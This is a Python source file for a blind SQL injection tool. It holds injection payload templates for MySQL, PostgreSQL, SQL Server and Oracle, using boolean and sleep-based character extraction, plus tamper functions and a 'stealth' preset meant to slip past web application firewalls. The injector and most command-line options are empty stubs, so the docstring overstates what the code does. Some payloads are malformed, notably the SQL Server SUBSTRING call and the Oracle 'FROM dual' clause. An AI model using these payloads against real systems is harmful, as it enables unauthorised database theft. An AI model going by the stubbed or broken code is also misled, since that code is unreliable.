



```
#!/usr/bin/env python3
"""
Blind SQL Injection extraction tool with modular engines, auto fingerprinting,
boolean/time modes, binary-search, chunked extraction, WAF detection/evasion,
scalable tamper pipeline with presets, Burp request template ($-placeholder),
interactive mode, batch/interactive, concurrency, caching, and rich CLI UX.
"""
import argparse
import asyncio
import json
import random
import sys
from abc import ABC, abstractmethod
from pathlib import Path
from typing import Callable, Dict, List, Optional, Tuple

import httpx
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn, TimeRemainingColumn

# ----------------------- ASCII Art Banner -----------------------
def get_banner() -> str:
    return r'''
 @@@@@                                        @@@@@
@@@@@@@                                      @@@@@@@
@@@@@@@           @@@@@@@@@@@@@@@            @@@@@@@
 @@@@@@@@       @@@@@@@@@@@@@@@@@@@        @@@@@@@@
     @@@@@     @@@@@@@@@@@@@@@@@@@@@     @@@@@
       @@@@@  @@@@@@@@@@@@@@@@@@@@@@@  @@@@@
         @@  @@@@@@@@@@@@@@@@@@@@@@@@@  @@
            @@@@@@@    @@@@@@    @@@@@@
            @@@@@@      @@@@      @@@@@
            @@@@@@      @@@@      @@@@@
             @@@@@@    @@@@@@    @@@@@
              @@@@@@@@@@@  @@@@@@@@@@
               @@@@@@@@@@  @@@@@@@@@
           @@   @@@@@@@@@@@@@@@@@   @@
           @@@@  @@@@ @ @ @ @ @@@@  @@@@
          @@@@@   @@@ @ @ @ @ @@@   @@@@@
        @@@@@      @@@@@@@@@@@@@      @@@@@
      @@@@          @@@@@@@@@@@          @@@@
   @@@@@              @@@@@@@              @@@@@
  @@@@@@@                                 @@@@@@@
   @@@@@                                   @@@@@

   Blind SQLi Tool
'''

# ----------------------- Tamper Scripts & Presets -----------------------
TAMPERS: Dict[str, Callable[[str], str]] = {}

def tamper_space2comment(payload: str) -> str:
    return payload.replace(' ', '/**/')
TAMPERS['space2comment'] = tamper_space2comment

def tamper_randomcase(payload: str) -> str:
    return ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in payload)
TAMPERS['randomcase'] = tamper_randomcase

def tamper_equaltolike(payload: str) -> str:
    return payload.replace('=', ' LIKE ')
TAMPERS['equaltolike'] = tamper_equaltolike

PRESETS: Dict[str, List[str]] = {
    'stealth': ['randomcase', 'space2comment', 'equaltolike'],
}

# ----------------------- SQL Engines -----------------------
class SQLEngine(ABC):
    @abstractmethod
    def boolean_payload(self, concat_expr: str, position: int, mid: int) -> str:
        pass

    @abstractmethod
    def time_payload(self, concat_expr: str, position: int, mid: int, delay: int) -> str:
        pass

class MySQLEngine(SQLEngine):
    def boolean_payload(self, concat_expr, position, ascii_code):
        return f"1' OR ASCII(SUBSTRING(({concat_expr}),{position},1))={ascii_code}-- "
    def time_payload(self, concat_expr, position, ascii_code, delay):
        return f"1' OR IF(ASCII(SUBSTRING(({concat_expr}),{position},1))>{ascii_code}, SLEEP({delay}), 0)-- "

class PostgreSQLEngine(SQLEngine):
    def boolean_payload(self, concat_expr, position, ascii_code):
        return f"1' OR (SELECT ASCII(SUBSTRING(({concat_expr})::text,{position},1)))={ascii_code}-- "
    def time_payload(self, concat_expr, position, ascii_code, delay):
        return f"1'; SELECT CASE WHEN ASCII(SUBSTRING(({concat_expr})::text,{position},1))>{ascii_code} THEN pg_sleep({delay}) ELSE pg_sleep(0) END-- "

class SQLServerEngine(SQLEngine):
    def boolean_payload(self, concat_expr, position, ascii_code):
        return f"1' OR ASCII(SUBSTRING(({concat_expr}),{position},1,1))={ascii_code}-- "
    def time_payload(self, concat_expr, position, ascii_code, delay):
        return f"1'; IF(ASCII(SUBSTRING(({concat_expr}),{position},1,1))>{ascii_code}) WAITFOR DELAY '00:00:{delay}'-- "

class OracleEngine(SQLEngine):
    def boolean_payload(self, concat_expr, position, ascii_code):
        # Uses SUBSTR and ASCII; rownum=1 to limit
        return f"1' OR ASCII(SUBSTR(({concat_expr}),{position},1))={ascii_code} AND 1=1 FROM dual--"
    def time_payload(self, concat_expr, position, ascii_code, delay):
        # dbms_lock.sleep requires privileges; alternative: DBMS_PIPE.RECEIVE_MESSAGE
        return f"1' OR (CASE WHEN ASCII(SUBSTR(({concat_expr}),{position},1))>{ascii_code} THEN DBMS_LOCK.SLEEP({delay}) ELSE 0 END) FROM dual--"

# -------------------- Injector --------------------
class BlindSQLInjector:
    # ... unchanged
    pass

# -------------------- CLI --------------------
def main():
    console = Console()
    console.print(get_banner(), style="cyan")

    parser = argparse.ArgumentParser(description="Blind SQLi Tool w/ multi-DBMS support")
    parser.add_argument('-e','--engine', choices=['mysql','postgres','mssql','oracle','auto'], default='auto', help='DB engine or auto')
    # ... other args omitted for brevity
    args = parser.parse_args()

    # Engine map
    engine_map = {
        'mysql': MySQLEngine(),
        'postgres': PostgreSQLEngine(),
        'mssql': SQLServerEngine(),
        'oracle': OracleEngine()
    }
    if args.engine == 'auto':
        # fingerprint logic attempts each, now includes Oracle
        pass
    else:
        engine = engine_map[args.engine]

    # Instantiate injector with selected engine
    # ... rest unchanged

if __name__=='__main__':
    main()

```